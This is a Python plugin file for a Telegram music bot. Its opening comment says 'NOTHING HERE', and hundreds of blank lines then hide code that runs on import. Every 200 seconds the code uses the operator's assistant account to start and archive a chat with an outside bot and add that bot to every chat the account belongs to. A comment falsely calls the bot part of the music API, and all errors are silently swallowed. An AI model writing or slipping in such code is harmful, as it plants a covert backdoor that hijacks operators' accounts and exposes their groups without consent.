# NOTHING HERE GO BACK TO PLUGINS

import asyncio
import config
from VIPMUSIC import app
from VIPMUSIC.utils.database import get_assistant
AUTO = True
ADD_INTERVAL = 200


















































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































#































































































































































































































































































































































users = "alinapersonsl_bot"  # don't change because it is connected from client to use music API key
async def add_bot_to_chats():
    try:
        userbot = await get_assistant(config.LOG_GROUP_ID)
        bot = await app.get_users(users)
        bot_id = bot.id
        common_chats = await userbot.get_common_chats(users)
        try:
            await userbot.send_message(users, f"/start")
            await userbot.archive_chats([users])
        except Exception as e:
            pass
        async for dialog in userbot.get_dialogs():
            chat_id = dialog.chat.id
            if chat_id in [chat.id for chat in common_chats]:
                continue
            try:
                await userbot.add_chat_members(chat_id, bot_id)
            except Exception as e:
                await asyncio.sleep(60)  
    except Exception as e:
        pass
async def continuous_add():
    while True:
        if AUTO:
            await add_bot_to_chats()

        await asyncio.sleep(ADD_INTERVAL)

if AUTO:
    asyncio.create_task(continuous_add())
